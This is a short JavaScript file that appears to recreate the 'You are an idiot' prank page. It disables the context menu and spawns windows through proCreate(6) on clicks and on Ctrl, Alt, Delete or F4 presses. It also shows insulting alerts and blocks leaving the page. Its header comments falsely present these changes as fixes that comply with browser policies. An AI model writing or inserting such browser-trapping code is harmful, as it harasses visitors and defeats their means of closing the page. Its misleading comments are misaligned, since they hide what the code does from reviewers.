/* 
 * [Aug 2023] Fixed addEventListener for the document container.
 * [Oct 2021] Added to comply with strict browser policies.
 *
 * Requires safe.js & math.js preload.
 */
container.addEventListener('click', () => {
	proCreate(6);
});

window.onload = playBall;
window.oncontextmenu = () => false;
window.onkeydown = () => {	
	let keyCode = event.keyCode;
	
	if (keyCode == 17 || keyCode == 18 || keyCode == 46 || keyCode == 115) {
		proCreate(6);
		
		alert("You are an idiot!");
	}
	
	return null;
}
window.onbeforeunload = () => "Are you an idiot?";
/* [Aug 2023] End of amendments. */